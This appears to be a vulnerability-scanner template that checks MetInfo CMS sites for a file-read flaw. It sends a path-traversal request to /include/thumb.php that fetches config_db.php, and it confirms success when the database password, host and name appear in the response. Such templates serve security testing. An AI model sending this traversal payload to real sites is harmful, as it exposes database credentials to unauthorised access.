expression: r0()
id: metinfo-file-read
info:
  author: amos1
  name: Metinfo file read
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b"con_db_pass")
      && response.body.bcontains(b"con_db_host") && response.body.bcontains(b"con_db_name")
    request:
      method: GET
      path: /include/thumb.php?dir=http/.....///.....///config/config_db.php
